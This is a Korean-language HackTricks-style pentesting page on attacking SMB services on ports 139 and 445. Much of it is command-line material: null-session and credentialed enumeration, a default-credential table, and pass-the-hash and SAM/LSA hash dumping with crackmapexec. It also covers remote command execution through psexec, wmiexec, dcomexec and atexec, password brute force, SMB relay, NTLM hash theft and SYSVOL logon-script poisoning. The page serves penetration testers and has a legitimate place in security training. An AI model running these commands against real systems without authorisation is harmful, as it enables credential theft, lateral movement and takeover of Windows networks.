# 139,445 - Pentesting SMB

{{#include ../../banners/hacktricks-training.md}}

## **Port 139**

The _**Network Basic Input Output System**_** (NetBIOS)** 는 로컬 영역 네트워크(LAN) 내의 애플리케이션, PC 및 데스크탑이 네트워크 하드웨어와 상호작용하고 **네트워크 전반에 걸친 데이터 전송을 용이하게 하는** 소프트웨어 프로토콜입니다. NetBIOS 네트워크에서 동작하는 소프트웨어 애플리케이션의 식별과 위치 파악은 NetBIOS 이름을 통해 이루어지며, 이 이름은 최대 16자까지 가능하고 종종 컴퓨터 이름과 다릅니다. 두 애플리케이션 간의 NetBIOS 세션은 한 애플리케이션(클라이언트 역할)이 다른 애플리케이션(서버 역할)에 "호출" 명령을 내려 **TCP Port 139** 를 사용할 때 시작됩니다.
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## 포트 445

기술적으로, Port 139은 ‘NBT over IP’로 불리며, Port 445는 ‘SMB over IP’로 식별됩니다. 약어 **SMB**는 ‘**Server Message Blocks**’의 약자이며, 현대에는 **Common Internet File System (CIFS)**로도 알려져 있습니다. 애플리케이션 계층 네트워크 프로토콜로서, SMB/CIFS는 주로 파일, 프린터, 직렬 포트에 대한 공유 접근을 가능하게 하고 네트워크 내 노드들 간의 다양한 형태의 통신을 촉진하는 데 사용됩니다.

예를 들어 Windows의 경우, SMB는 TCP/IP 위에서 직접 동작할 수 있어 NetBIOS over TCP/IP의 필요성을 제거하며, 이를 위해 port 445를 사용합니다. 반대로 다른 시스템에서는 port 139의 사용이 관찰되며, 이는 SMB가 NetBIOS over TCP/IP와 함께 실행되고 있음을 나타냅니다.
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

The **Server Message Block (SMB)** 프로토콜은 **client-server** 모델로 동작하며, 프린터나 라우터 같은 다른 네트워크 자원뿐만 아니라 파일과 디렉터리에 대한 **접근**을 조절하도록 설계되었습니다. 주로 **Windows** 운영체제 계열에서 사용되며, SMB는 하위 호환성을 보장하여 최신 버전의 Microsoft 운영체제를 실행하는 장치가 구버전을 실행하는 장치와 원활하게 상호작용할 수 있게 합니다. 또한 **Samba** 프로젝트는 무료 소프트웨어 솔루션을 제공하여 **Linux** 및 **Unix** 시스템에서 SMB를 구현할 수 있게 하므로 SMB를 통한 크로스플랫폼 통신을 가능하게 합니다.

Shares는 **로컬 파일 시스템의 임의 부분(arbitrary parts of the local file system)**을 나타내며, SMB 서버가 이를 제공할 수 있어 클라이언트에게 계층 구조를 서버의 실제 구조와 부분적으로 **독립적(independent)**으로 표시할 수 있습니다. **Access Control Lists (ACLs)**는 **접근 권한(access rights)**을 정의하며, `execute`, `read`, `full access` 같은 속성을 포함한 사용자 권한에 대해 **세밀한 제어(fine-grained control)**를 허용합니다. 이러한 권한은 shares를 기준으로 개별 사용자나 그룹에 할당될 수 있으며, 서버에 설정된 로컬 권한과는 구분됩니다.

### IPC$ Share

IPC$ share에 대한 접근은 익명의 null session을 통해 얻을 수 있으며, 이를 통해 named pipes로 노출된 서비스와 상호작용할 수 있습니다. 이 목적에는 유틸리티 `enum4linux`가 유용합니다. 적절히 사용하면 다음을 획득할 수 있습니다:

- 운영 체제에 대한 정보
- 상위 도메인에 대한 세부 정보
- 로컬 사용자 및 그룹 목록
- 사용 가능한 SMB shares에 대한 정보
- 적용되는 시스템 보안 정책

이 기능은 네트워크 관리자를 비롯한 보안 전문가가 네트워크상의 SMB (Server Message Block) 서비스의 보안 태세를 평가하는 데 매우 중요합니다. `enum4linux`는 대상 시스템의 SMB 환경에 대한 포괄적인 뷰를 제공하여 잠재적 취약점을 식별하고 SMB 서비스가 적절히 보호되고 있는지 확인하는 데 필수적입니다.
```bash
enum4linux -a target_ip
```
위 명령은 `enum4linux`가 `target_ip`로 지정된 대상에 대해 전체 enumeration을 수행하는 예시입니다.

## NTLM이란

NTLM이 무엇인지 모르거나 이 프로토콜의 동작 방식과 악용 방법을 알고 싶다면, **NTLM**에 관한 다음 페이지가 매우 흥미로울 것입니다. 이 페이지에는 **이 프로토콜이 어떻게 동작하며 이를 어떻게 활용할 수 있는지**가 설명되어 있습니다:


{{#ref}}
../../windows-hardening/ntlm/
{{#endref}}

## **서버 Enumeration**

### **Scan** 네트워크에서 호스트 검색:
```bash
nbtscan -r 192.168.0.1/24
```
### SMB 서버 버전

SMB 버전의 가능한 exploits를 찾으려면 어떤 버전이 사용 중인지 아는 것이 중요합니다. 다른 도구들에서 이 정보가 표시되지 않는다면, 다음을 사용할 수 있습니다:

- **MSF** auxiliary module `**auxiliary/scanner/smb/smb_version**`
- 또는 이 스크립트:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **검색 exploit**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **가능한** 자격 증명

| **사용자 이름(들)**  | **일반 비밀번호**                        |
| -------------------- | ----------------------------------------- |
| _(blank)_            | _(blank)_                                 |
| guest                | _(blank)_                                 |
| Administrator, admin | _(blank)_, password, administrator, admin |
| arcserve             | arcserve, backup                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, admin                   |
| backupexec, backup   | backupexec, backup, arcada                |
| test, lab, demo      | password, test, lab, demo                 |

### Brute Force

- [**SMB Brute Force**](../../generic-hacking/brute-force.md#smb)

### SMB 환경 정보

### 정보 수집
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### 사용자, 그룹 및 로그인한 사용자 열거

이 정보는 이미 enum4linux 및 enum4linux-ng에서 수집되었어야 합니다.
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### 로컬 사용자 열거

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
Oneliner
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - 로컬 사용자 열거
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **LSARPC 및 SAMR rpcclient 열거**


{{#ref}}
rpcclient-enumeration.md
{{#endref}}

### linux에서 GUI 연결

#### 터미널에서:

`xdg-open smb://cascade.htb/`

#### 파일 브라우저 창에서 (nautilus, thunar 등)

`smb://friendzone.htb/general/`

## 공유 폴더 열거

### 공유 폴더 나열

항상 접근 가능한 항목이 있는지 확인하세요. credentials가 없다면 **null** **credentials/guest user**를 사용해 보세요.
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **공유 폴더 연결/목록**
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **수동으로 Windows 공유를 열거하고 연결하기**

호스트 머신의 공유 표시가 제한되어 있어 목록을 확인할 때 연결할 수 있는 공유가 없는 것처럼 보일 수 있습니다. 따라서 수동으로 공유에 연결해 보는 시도가 가치가 있을 수 있습니다.

공유를 수동으로 열거하려면 유효한 세션(예: null session 또는 valid credentials)을 사용할 때 NT_STATUS_ACCESS_DENIED 및 NT_STATUS_BAD_NETWORK_NAME 같은 응답을 확인하는 것이 좋습니다. 이러한 응답은 공유가 존재하지만 접근 권한이 없음을 나타내거나, 공유 자체가 존재하지 않음을 알려줄 수 있습니다.

Common share names for windows targets are

- C$
- D$
- ADMIN$
- IPC$
- PRINT$
- FAX$
- SYSVOL
- NETLOGON

(일반적인 공유 이름 — _**Network Security Assessment 3rd edition**_에서 발췌)

You can try to connect to them by using the following command
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
또는 이 스크립트 (null session을 사용하여)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
예제들
```bash
smbclient -U '%' -N \\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Windows에서 공유 열거 / 타사 도구 없이**

PowerShell
```bash
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
CMD 콘솔
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
MMC 스냅인 (그래픽 인터페이스)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
explorer.exe(그래픽 인터페이스)에서 `\\<ip>\` 를 입력하면 사용 가능한 숨김이 아닌 공유를 볼 수 있습니다.

### 공유 폴더 마운트하기
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **파일 다운로드**

이전 섹션을 읽어 credentials/Pass-the-Hash를 사용해 연결하는 방법을 배우세요.
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
명령어:

- mask: 디렉터리 내의 파일을 필터링하는 데 사용되는 마스크를 지정합니다(예: ""는 모든 파일)
- recurse: 재귀 기능을 켜거나 끕니다(기본값: off)
- prompt: 파일 이름에 대한 프롬프트를 비활성화합니다(기본값: on)
- mget: mask와 일치하는 모든 파일을 호스트에서 클라이언트 머신으로 복사합니다

(_smbclient의 manpage에서 가져온 정보_)

### 도메인 공유 폴더 검색

- [**Snaffler**](https://github.com/SnaffCon/Snaffler)
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
- [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) spider.
- `-M spider_plus [--share <share_name>]`
- `--pattern txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
특히 공유에서 흥미로운 파일은 **`Registry.xml`**로, 이 파일은 Group Policy를 통해 **autologon**으로 구성된 사용자들의 비밀번호를 **포함할 수 있습니다**. 또는 **`web.config`** 파일은 자격 증명을 포함하고 있습니다.

> [!TIP]
> **SYSVOL share**는 도메인 내 인증된 모든 사용자에게 **읽기 가능**합니다. 그 안에서는 다양한 batch, VBScript, PowerShell **스크립트**들을 **찾을 수 있습니다**.
> 해당 스크립트들을 반드시 **확인**해야 하며 비밀번호와 같은 민감한 정보가 포함되어 있을 수 있습니다. 또한 자동화된 공유 목록을 그대로 신뢰하지 마세요: 공유가 읽기 전용으로 보이더라도 내부의 NTFS ACLs가 쓰기를 허용할 수 있습니다. 항상 smbclient로 작은 파일을 `\\<dc>\\SYSVOL\\<domain>\\scripts\\`에 업로드해 테스트하세요.
> 쓰기 가능하다면, [poison logon scripts for RCE at user logon](../../windows-hardening/active-directory-methodology/acl-persistence-abuse/README.md#sysvolnetlogon-logon-script-poisoning)를 수행할 수 있습니다.

### ShareHound – OpenGraph collector for SMB shares (BloodHound)

[ShareHound](https://github.com/p0dalirius/sharehound)은 도메인 SMB 공유를 발견하고 이를 순회하여 ACL을 추출한 뒤, BloodHound CE/Enterprise용 OpenGraph JSON 파일을 생성합니다.

- Baseline collection:
1) LDAP: 컴퓨터 객체를 열거하고 `dNSHostName`을 읽음
2) DNS: 각 호스트를 resolve(해결)
3) SMB: 접근 가능한 호스트의 공유 목록을 나열
4) 공유를 크롤링(Crawl) (BFS/DFS), 파일/폴더를 열거하고 권한을 캡처

ShareQL-driven traversal
- [ShareQL](https://github.com/p0dalirius/shareql)는 호스트/공유/경로별로 탐색 허용/거부를 지정하고 규칙별 최대 깊이를 설정할 수 있는 first-match-wins DSL입니다. 흥미로운 공유에 집중하고 재귀 깊이를 제한하세요.

Example ShareQL rules
```text
# Only crawl shares with name containing "backup", up to depth 2
allow host * share * path * depth 0
allow host * share *backup* path * depth 2
deny  host * share * path *
```
사용법
```bash
sharehound -ai "10.0.100.201" -au "user" -ap "Test123!" -ns "10.0.100.201" \
-rf "rules/skip_common_shares.shareql" -rf "rules/max_depth_2.shareql"
```
- `-ad`/`-au`/`-ap`를 통해 AD 자격 증명을 제공(또는 `-ad`를 `-au`/`-ap`와 함께 사용). 인라인 규칙이나 파일에는 `-r`/`-rf`를 사용하세요.
- 출력: JSON OpenGraph; BloodHound에 임포트하여 hosts/shares/files 및 effective rights를 쿼리하세요.
- 팁: 필터가 매우 제한적이지 않는 한 최대 깊이(max depth)를 1–2로 제한하세요.

BloodHound 공격 표면 쿼리
- shares에 대해 write-like access를 가진 Principals
```cypher
MATCH x=(p)-[r:CanWriteDacl|CanWriteOwner|CanDsWriteProperty|CanDsWriteExtendedProperties]->(s:NetworkShareSMB)
RETURN x
```
- 공유에 대해 FULL_CONTROL 권한이 있는 Principals
<details>
<summary>Cypher: 공유에 대해 FULL_CONTROL 권한이 있는 Principals</summary>
```cypher
MATCH (p:Principal)-[r]->(s:NetworkShareSMB)
WHERE (p)-[:CanDelete]->(s)
AND (p)-[:CanDsControlAccess]->(s)
AND (p)-[:CanDsCreateChild]->(s)
AND (p)-[:CanDsDeleteChild]->(s)
AND (p)-[:CanDsDeleteTree]->(s)
AND (p)-[:CanDsListContents]->(s)
AND (p)-[:CanDsListObject]->(s)
AND (p)-[:CanDsReadProperty]->(s)
AND (p)-[:CanDsWriteExtendedProperties]->(s)
AND (p)-[:CanDsWriteProperty]->(s)
AND (p)-[:CanReadControl]->(s)
AND (p)-[:CanWriteDacl]->(s)
AND (p)-[:CanWriteOwner]->(s)
RETURN p,r,s
```
</details>

- 확장자별로 민감한 파일을 찾아라 (예: VMDKs)
```cypher
MATCH p=(h:NetworkShareHost)-[:HasNetworkShare]->(s:NetworkShareSMB)-[:Contains*0..]->(f:File)
WHERE toLower(f.extension) = toLower(".vmdk")
RETURN p
```
## 레지스트리 읽기

발견한 자격 증명을 사용하여 **레지스트리를 읽을 수 있습니다**. Impacket **`reg.py`**를 사용하여 시도해볼 수 있습니다:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## 포스트 익스플로이테이션

**Samba** 서버의 **기본 구성**은 보통 `/etc/samba/smb.conf`에 위치하며 몇 가지 **위험한 구성**이 있을 수 있습니다:

| **설정**                    | **설명**                                                            |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | 현재 공유에서 사용 가능한 공유를 나열하도록 허용합니까?             |
| `read only = no`            | 파일의 생성 및 수정을 금지합니까?                                  |
| `writable = yes`            | 사용자가 파일을 생성하고 수정하도록 허용합니까?                    |
| `guest ok = yes`            | 비밀번호 없이 서비스에 연결하는 것을 허용합니까?                   |
| `enable privileges = yes`   | 특정 SID에 할당된 권한을 존중합니까?                              |
| `create mask = 0777`        | 새로 생성된 파일에 어떤 권한이 할당되어야 합니까?                  |
| `directory mask = 0777`     | 새로 생성된 디렉터리에 어떤 권한이 할당되어야 합니까?              |
| `logon script = script.sh`  | 사용자 로그인 시 어떤 스크립트를 실행해야 합니까?                  |
| `magic script = script.sh`  | 스크립트가 종료될 때 어떤 스크립트를 실행해야 합니까?              |
| `magic output = script.out` | 매직 스크립트의 출력은 어디에 저장되어야 합니까?                  |

` smbstatus` 명령은 **서버** 및 **누가 연결되어 있는지**에 대한 정보를 제공합니다.

## Kerberos를 사용하여 인증

도구 **smbclient** 및 **rpcclient**를 사용하여 **Kerberos**에 **인증**할 수 있습니다:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
Kerberos-only 환경(NTLM 비활성화)에서는 SMB에 대한 NTLM 시도가 `STATUS_NOT_SUPPORTED`를 반환할 수 있습니다. 일반적인 Kerberos 문제를 해결하고 Kerberos auth를 강제하세요:
```bash
# sync clock to avoid KRB_AP_ERR_SKEW
sudo ntpdate <dc.fqdn>

# use Kerberos with tooling (reads your TGT from ccache)
netexec smb <dc.fqdn> -k
```
완전한 클라이언트 설정(krb5.conf 생성, kinit, SSH GSSAPI/SPN 주의사항)은 다음을 참조하세요:

{{#ref}}
../pentesting-kerberos-88/README.md
{{#endref}}

## **명령 실행**

### **crackmapexec**

crackmapexec는 **mmcexec, smbexec, atexec, wmiexec** 중 어떤 것을 사용하여 명령을 실행할 수 있으며, 기본 방법은 **wmiexec**입니다. 선호하는 옵션은 `--exec-method` 파라미터로 지정할 수 있습니다:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md)**/**[**smbexec**](../../windows-hardening/lateral-movement/smbexec.md)

두 옵션 모두 대상 머신에서 (SMB를 통해 _\pipe\svcctl_를 사용하여) **새 서비스를 생성**하고 이를 사용해 **무언가를 실행**합니다. (**psexec**는 실행 파일을 ADMIN$ share에 **업로드**하고, **smbexec**는 **cmd.exe/powershell.exe**를 가리키며 인수에 페이로드를 넣습니다 — **file-less technique**).\
**자세한 정보**는 [**psexec** ](../../windows-hardening/lateral-movement/psexec-and-winexec.md)와 [**smbexec**](../../windows-hardening/lateral-movement/smbexec.md).\
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```
**parameter**`-k`를 사용하면 **NTLM** 대신 **kerberos**로 인증할 수 있습니다.

### [wmiexec](../../windows-hardening/lateral-movement/wmiexec.md)/dcomexec

디스크를 건드리거나 새로운 서비스를 실행하지 않고 DCOM을 통해 **port 135.**에서 명령 셸을 은밀히 실행합니다.\\
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
**매개변수**`-k`를 사용하면 **NTLM** 대신 **kerberos**로 인증할 수 있습니다.
```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```
### [AtExec](../../windows-hardening/lateral-movement/atexec.md)

Task Scheduler를 통해 명령을 실행합니다 (SMB를 통한 _\pipe\atsvc_ 사용).\
**kali**에서는 /usr/share/doc/python3-impacket/examples/에 위치합니다.
```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
## Impacket 참고

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

### ksmbd 공격 표면 및 SMB2/SMB3 프로토콜 퍼징 (syzkaller)

{{#ref}}
ksmbd-attack-surface-and-fuzzing-syzkaller.md
{{#endref}}

## **Bruteforce 사용자 자격 증명**

**권장하지 않습니다. 허용된 최대 시도 횟수를 초과하면 계정이 차단될 수 있습니다.**
```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```
## SMB relay attack

이 공격은 Responder 툴킷을 사용해 내부 네트워크에서 **capture SMB authentication sessions**을 포착하고, 이를 **relays**하여 **target machine**으로 전달합니다. 인증 **session is successful**일 경우 자동으로 **system** **shell**로 진입합니다.\
[**More information about this attack here.**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Windows 라이브러리 URLMon.dll은 페이지가 SMB를 통해 일부 컨텐츠에 접근하려 할 때 자동으로 호스트에 인증을 시도합니다. 예: `img src="\\10.10.10.10\path\image.jpg"`

This happens with the functions:

- URLDownloadToFile
- URLDownloadToCache
- URLOpenStream
- URLOpenBlockingStream

이 함수들은 일부 브라우저와 도구(예: Skype)에서 사용됩니다.

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../images/image (358).png>)

### MitMf를 이용한 SMBTrap

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../images/image (892).png>)

## NTLM Theft

SMB Trapping과 유사하게, 악성 파일을 타깃 시스템에 심어(예: SMB를 통해) SMB 인증 시도를 유발할 수 있으며, Responder 같은 도구로 NetNTLMv2 해시를 가로챌 수 있습니다. 그 해시는 오프라인에서 크랙하거나 [SMB relay attack](#smb-relay-attack)에 사용할 수 있습니다.

[See: ntlm_theft](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm_theft)

## HackTricks 자동 명령
```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```
## 참고자료

